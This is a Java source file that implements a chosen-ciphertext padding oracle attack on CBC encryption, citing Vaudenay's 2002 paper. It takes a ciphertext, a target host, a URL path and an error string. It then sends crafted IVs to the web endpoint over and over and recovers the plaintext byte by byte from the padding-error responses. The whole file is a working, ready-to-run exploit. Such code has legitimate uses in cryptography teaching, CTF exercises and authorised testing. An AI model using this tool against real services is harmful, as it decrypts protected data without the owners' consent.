// using Jsoup for more comfortable HTML work
import org.jsoup.Jsoup;

import java.io.IOException;
import java.util.ArrayList;

/*
Implemantation of a Chosen Ciphertext Padding Oracle Attack.

by j05ch, 2018

Original paper by Serge Vaudenay (https://www.iacr.org/cryptodb/archive/2002/EUROCRYPT/2850/2850.pdf)

Takes five input parameters:
--c CIPHER (e.g. de589180806b1e7f5ad77630a1a265e206ed4efdcab3810b06447e3a5f2eabbf3e0f8e2a52b96e1defec8f16e8fbeddb)
--h HOST (e.g. http://www.example.com)
--u URLDESTINATION (e.g. /bin/return?=)
--e ERRORCODE (e.g. "Incorrect padding ")
 */

public class POAExploit {

    // calls oracle and returns true if padding is not valid
    private static boolean callOracle(String cipher, String host, String url, String errorCode) {

        String html = null;
        try {
            html = Jsoup.connect(host + url + cipher).get().html();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return html.contains(errorCode);
    }

    // returns value1 xor value2 xor value3
    private static int exclusiveOR(int value1, int value2, int value3) {
        return value1 ^ value2 ^ value3;
    }

    // hex to ASCII
    private static StringBuilder hexToAscii(String hex) {
        StringBuilder output = new StringBuilder();
        for (int i = 0; i < hex.length(); i += 2) {
            String str = hex.substring(i, i + 2);
            output.append((char) Integer.parseInt(str, 16));
        }
        return output;
    }

    public static void main(String[] args) {

        // length of one cipher block (= 16 bytes) x 2 (for hex)
        // (you may change this to 16 if block length is 8 bytes)
        final int BLOCKSIZE = 32;

        String cipher = null;
        String host = null;
        String urlDest = null;
        String errorCode = null;

        // test input arguments

        if (args.length < 8) {
            System.out.println("Params needed: --c CIPHER --h HOST --u URLDESTINATION --e ERRORCODE");
            System.exit(1);
        }

        if (args[0].equals("--c") && args[2].equals("--h") && args[4].equals("--u") && args[6].equals("--e")) {
            cipher = args[1];
            host = args[3];
            urlDest = args[5];
            errorCode = args[7];
        } else {
            System.out.println("Params needed: --c CIPHER --h HOST --u URLDESTINATION --e ERRORCODE");

            System.exit(1);
        }

        // cipher string to upper case
        cipher = cipher.toUpperCase();

        // length of input cipher
        int cipherLength = cipher.length();

        // amount of cipher blocks
        int noOfBlocks = 0;

        // is input cipher valid?
        if (cipherLength % BLOCKSIZE == 0 && cipherLength / BLOCKSIZE > 1) {
            noOfBlocks = cipherLength / BLOCKSIZE;
        } else {
            System.out.println("Not a valid cipher.");
            System.exit(1);
        }

        // end of block n
        int blockEnd = BLOCKSIZE;

        // ArrayList that contains all cipher blocks
        ArrayList<String> blockList = new ArrayList<>(noOfBlocks);

        for (int i = 0; i < noOfBlocks; i++) {
            blockList.add(cipher.substring(blockEnd - BLOCKSIZE, blockEnd));
            blockEnd += BLOCKSIZE;
        }

        // ArrayList that contains all found blocks (one block less than cipher blocks as first cipher block is IV)
        ArrayList<String> foundList = new ArrayList<>(noOfBlocks - 1);

        // init for found blocks
        String foundBytes = "00000000000000000000000000000000";
        for (int i = 0; i < noOfBlocks - 1; i++) {
            foundList.add(foundBytes);
        }

        String tempFoundBlock;
        String tempHex;

        int foundByteInInt;
        String foundByteInHex;

        int padding;
        int newPaddingInt;
        String newPaddingHex;

        // for every cipher block (except c0 == IV) do
        for (int i = 1; i < noOfBlocks; i++) {

            System.out.println("Working on block " + i);

            // chosen IV for CCA
            String chosenIV = "00000000000000000000000000000000";

            padding = 1;

            // for every byte in block do
            for (int halfByte = BLOCKSIZE - 2; halfByte >= 0; halfByte -= 2) {

                // test for values from 0 to 255
                for (int j = 0; j < 256; j++) {
                    if (j < 16) {
                        tempHex = "0" + Integer.toHexString(j);
                    } else {
                        tempHex = Integer.toHexString(j);
                    }

                    // build own IV (tempHex is the byte we are working on)
                    chosenIV = chosenIV.substring(0, halfByte) + tempHex + chosenIV.substring(halfByte + 2, BLOCKSIZE);

                    // call oracle with own IV (returns true if error is reveived), calculate found byte if padding is correct
                    if (!callOracle(chosenIV + blockList.get(i), host, urlDest, errorCode)) {
                        int ivByte = Integer.parseInt(blockList.get(i - 1).substring(halfByte, halfByte + 2), 16);

                        foundByteInInt = exclusiveOR(padding, Integer.parseInt(tempHex, 16), ivByte);

                        // fill hex with 0 if int < 16
                        foundByteInHex = foundByteInInt < 16 ? "0" + Integer.toHexString(foundByteInInt) : Integer.toHexString(foundByteInInt);

                        // save found block temporarily
                        tempFoundBlock = foundList.get(i - 1);
                        tempFoundBlock = tempFoundBlock.substring(0, halfByte) + foundByteInHex + tempFoundBlock.substring(halfByte + 2, BLOCKSIZE);

                        // set padding for next round
                        if (padding < 16) {
                            for (int k = 1; k <= padding; k++) {
                                int foundByteTemp = Integer.parseInt(tempFoundBlock.substring(BLOCKSIZE - 2 * k, 32 - 2 * k + 2), 16);
                                int origIVByte = Integer.parseInt(blockList.get(i - 1).substring(BLOCKSIZE - 2 * k, BLOCKSIZE - 2 * k + 2), 16);

                                // e.g. from 01 to 02
                                newPaddingInt = exclusiveOR(foundByteTemp, padding + 1, origIVByte);
                                newPaddingHex = newPaddingInt < 16 ? "0" + Integer.toHexString(newPaddingInt) : Integer.toHexString(newPaddingInt);

                                // update chosen IV
                                chosenIV = chosenIV.substring(0, BLOCKSIZE - 2 * k) + newPaddingHex + chosenIV.substring(BLOCKSIZE - 2 * k + 2, BLOCKSIZE);
                            }
                        }
                        padding++;

                        // update list entry of found blocks
                        foundList.set(i - 1, tempFoundBlock);
                        break;
                    }
                }
                System.out.println(foundList.get(i - 1));
            }
            System.out.print("\n");
        }

        // print found blocks and plaintext

        String hex = new String();

        System.out.println("Decoded cipher:");
        for (String s : foundList) {
            System.out.print(s);
            hex += s;
        }

        System.out.println("\n\nPlaintext:\n" + hexToAscii(hex));
    }
}